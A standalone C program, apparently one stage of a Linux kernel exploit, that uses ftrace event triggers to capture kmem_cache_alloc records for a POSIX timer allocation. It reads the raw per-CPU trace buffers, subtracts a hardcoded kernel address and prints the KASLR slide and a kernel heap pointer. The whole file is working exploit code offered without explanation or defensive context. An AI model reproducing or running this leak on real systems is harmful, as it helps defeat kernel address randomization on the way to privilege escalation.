#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#ifndef TIMER_REQ
#define TIMER_REQ 0x180U
#endif
#ifndef SITE_LOW
#define SITE_LOW 0x1e005cU
#endif
#ifndef TIMER_LINK
#define TIMER_LINK 0xffffffc0803e005cULL
#endif
#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"

static int write_file(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static void kick(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
}

int main(void)
{
	struct sigevent event;
	timer_t id;
	int shown = 0, fd;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	write_file(TRACE "/buffer_size_kb", "2048\n");
	write_file(TRIGGER, "enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	fd = open(TRACE "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
	if (fd >= 0)
		close(fd);
	write_file(TRACE "/tracing_on", "1\n");
	kick();
	if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &id)) {
		dprintf(STDOUT_FILENO, "[slide] timer_create errno=%d\n", errno);
		return 1;
	}
	timer_delete(id);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < 8; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (!strstr(line, "kmem_cache_alloc") && !strstr(line, "bytes_req=384") &&
			    !strstr(line, "posix_timers"))
				continue;
			if (shown < 24) {
				dprintf(STDOUT_FILENO, "[slide] cpu%d %s", cpu, line);
				shown++;
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO, "[slide] lines=%d\n", shown);
	for (int cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = mmap(NULL, 2U << 20, PROT_READ | PROT_WRITE,
				    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		size_t used = 0;
		int fd, hits = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0 || buf == MAP_FAILED)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (2U << 20) - used);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				break;
			}
			if (n == 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (2U << 20))
				break;
		}
		close(fd);
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&req, buf + i + 24, 8);
			if (req != TIMER_REQ)
				continue;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			if ((site & 0x1fffff) != SITE_LOW)
				continue;
			dprintf(STDOUT_FILENO,
				"[slide] raw cpu%d site=%#" PRIx64
				" slide=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				cpu, site, (uint64_t)(site - TIMER_LINK), ptr);
			hits++;
		}
		dprintf(STDOUT_FILENO, "[slide] raw cpu%d bytes=%zu hits=%d\n", cpu, used, hits);
		munmap(buf, 2U << 20);
	}
	write_file(TRIGGER, "!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRIGGER, "disable_event:kmem:kmem_cache_alloc\n");
	kick();
	write_file(TRIGGER, "!disable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
	write_file(TRACE "/tracing_on", "0\n");
	return shown ? 0 : 2;
}
